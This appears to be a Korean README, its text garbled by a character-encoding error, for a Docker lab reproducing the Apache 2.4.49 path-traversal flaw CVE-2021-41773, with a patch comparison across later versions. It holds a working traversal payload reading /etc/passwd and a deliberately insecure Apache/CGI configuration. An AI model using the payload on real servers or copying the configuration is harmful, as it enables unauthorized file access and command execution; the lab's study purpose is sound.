# CVE-2021-41773 Apache Path Traversal PoC

## ê°œìš”

ì´ ë³´ê³ ì„œëŠ” Apache HTTP Server 2.4.49 ë²„ì „ì—ì„œ ë°œìƒí•œ ê²½ë¡œ íƒìƒ‰(Path Traversal) ë° ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE) ì·¨ì•½ì (CVE-2021-41773)ì— ëŒ€í•œ PoCë¥¼ Docker í™˜ê²½ìœ¼ë¡œ ì¬í˜„í•˜ê³ , ë¶„ì„ ê²°ê³¼ë¥¼ ì •ë¦¬í•œ ë¬¸ì„œì…ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ URL ì¸ì½”ë”©ì„ ìš°íšŒí•˜ì—¬ ì‹œìŠ¤í…œ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

---

## ì·¨ì•½ì  ì„¤ëª…

- Apache 2.4.49ì—ì„œëŠ” ìš”ì²­ ê²½ë¡œ ë‚´ì˜ `../` ê²½ë¡œ íƒìƒ‰ ë¬¸ìì—´ì— ëŒ€í•œ í•„í„°ë§ì´ ë¶ˆì™„ì „í•˜ì—¬, URL ì¸ì½”ë”©(`%2e%2e/`) ë“±ì„ ì´ìš©í•œ ìš°íšŒê°€ ê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤.
- ì´ë¡œ ì¸í•´ ê³µê²©ìëŠ” ì›¹ ë£¨íŠ¸ ë°–ì˜ ì‹œìŠ¤í…œ íŒŒì¼(`/etc/passwd` ë“±)ì— ì ‘ê·¼í•˜ê±°ë‚˜, CGI ê¸°ëŠ¥ì´ í™œì„±í™”ëœ ê²½ìš° ì„ì˜ì˜ ëª…ë ¹ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

---

## ì·¨ì•½ í™˜ê²½ êµ¬ì„± íŒŒì¼

### ğŸ“„ Dockerfile

```dockerfile
FROM ubuntu:20.04

RUN apt-get update --allow-releaseinfo-change && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
    wget curl make gcc g++ perl libpcre3 libpcre3-dev \
    libapr1 libapr1-dev libexpat1-dev && \
    apt-get clean

RUN wget https://archive.apache.org/dist/apr/apr-1.7.0.tar.gz && \
    tar xvfz apr-1.7.0.tar.gz && cd apr-1.7.0 && \
    ./configure --prefix=/usr/local/apr && make && make install

RUN wget https://archive.apache.org/dist/apr/apr-util-1.6.1.tar.gz && \
    tar xvfz apr-util-1.6.1.tar.gz && cd apr-util-1.6.1 && \
    ./configure --with-apr=/usr/local/apr --prefix=/usr/local/apr-util && \
    make && make install

RUN wget https://sourceforge.net/projects/pcre/files/pcre/8.45/pcre-8.45.tar.gz && \
    tar xvfz pcre-8.45.tar.gz && cd pcre-8.45 && \
    ./configure --prefix=/usr/local/pcre && make && make install

RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz && \
    tar -xf httpd-2.4.49.tar.gz && cd httpd-2.4.49 && \
    ./configure --prefix=/usr/local/apache2.4.49 \
    --enable-module=so --enable-rewrite --enable-so \
    --with-apr=/usr/local/apr/ \
    --with-apr-util=/usr/local/apr-util \
    --with-pcre=/usr/local/pcre \
    --enable-mods-shared=all && \
    make && make install

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 8080
CMD ["/entrypoint.sh"]
```

### ğŸ“„ entrypoint.sh

```bash
#!/bin/bash

sed -i 's/Listen 80/Listen 8080/' /usr/local/apache2.4.49/conf/httpd.conf
sed -i 's/Require all denied/Require all granted/' /usr/local/apache2.4.49/conf/httpd.conf
sed -i '/mod_cgi.so/s/^#//g' /usr/local/apache2.4.49/conf/httpd.conf

cat <<EOF >> /usr/local/apache2.4.49/conf/httpd.conf

<Directory "/usr/local/apache2.4.49/cgi-bin">
    Options +ExecCGI
    AddHandler cgi-script .sh
    Require all granted
</Directory>
EOF

/usr/local/apache2.4.49/bin/httpd -k start -DFOREGROUND
```

### ğŸ“„ docker-compose.yml

```yaml
version: '3'
services:
  apache-vuln:
    build: .
    ports:
      - "8080:8080"
```

---

## PoC ìˆ˜í–‰

### 1ï¸âƒ£ ë„ì»¤ ë¹Œë“œ ë° ì‹¤í–‰

```bash
docker compose up -d
```

### 2ï¸âƒ£ Apache ë²„ì „ í™•ì¸

```bash
curl -I http://localhost:8080
```
![alt text](image-1.png)
### 3ï¸âƒ£ Path Traversal í…ŒìŠ¤íŠ¸

```bash
curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
```
![alt text](image-2.png)
---

## íŒ¨ì¹˜ ë¶„ì„ ë° ë²„ì „ ë¹„êµ

| ë²„ì „ | ìš°íšŒ ê°€ëŠ¥ ì—¬ë¶€ | ì„¤ëª… |
|------|----------------|------|
| 2.4.49 | âœ… ê°€ëŠ¥ | `%2e%2e/` ì¸ì½”ë”© í•„í„°ë§ ë¯¸í¡ |
| 2.4.50 | âœ… ê°€ëŠ¥ | ì´ì¤‘ ì¸ì½”ë”©(`%%32%65`)ìœ¼ë¡œ ìš°íšŒ ê°€ëŠ¥ |
| 2.4.51 | âŒ ì°¨ë‹¨ | ì´ì¤‘ ì¸ì½”ë”©, ìŠ¬ë˜ì‹œ í•„í„°ë§ê¹Œì§€ ì™„ì „ ì°¨ë‹¨ |

> ApacheëŠ” `ap_normalize_path`, `ap_unescape_url` í•¨ìˆ˜ì— í•„í„°ë§ì„ ì¶”ê°€í•˜ì—¬ ìš°íšŒ ê°€ëŠ¥ì„±ì„ ì›ì²œ ì°¨ë‹¨

---
